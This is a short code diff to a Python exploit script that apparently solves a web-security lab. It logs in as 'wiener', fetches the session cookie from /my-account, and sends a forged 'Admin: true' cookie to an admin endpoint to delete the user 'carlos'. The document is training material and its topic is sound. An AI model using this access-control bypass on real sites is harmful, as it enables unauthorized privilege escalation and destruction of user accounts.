@@ -30,15 +30,14 @@ def delete_user(s, url):
     if "Log out" in res:
         print("(+) Successfully logged in as the wiener user.")
 
-        session_cookie = r.cookies.get_dict().get('session')
-        print(session_cookie)
-
-        # Retrieve session cookie
-        session_cookie = r.cookies.get_dict().get('session')
+        # NOTE - Made a small change to fix retrieving the session cookie
+        my_account_url = url + "/my-account"
+        r = s.get(my_account_url, verify=False, proxies=proxies)
+        session_cookie = s.cookies.get_dict().get('session')
 
         # Visit the admin panel and delete the user carlos
         delete_carlos_user_url = url + "/admin/delete?username=carlos"
-        cookies = {'session': session_cookie, "Admin": "true"}
+        cookies = {'Admin': 'true', 'session': session_cookie}
         r = requests.get(delete_carlos_user_url, cookies=cookies, verify=False, proxies=proxies)
         if r.status_code == 200:
             print('(+) Successfully deleted Carlos user.')
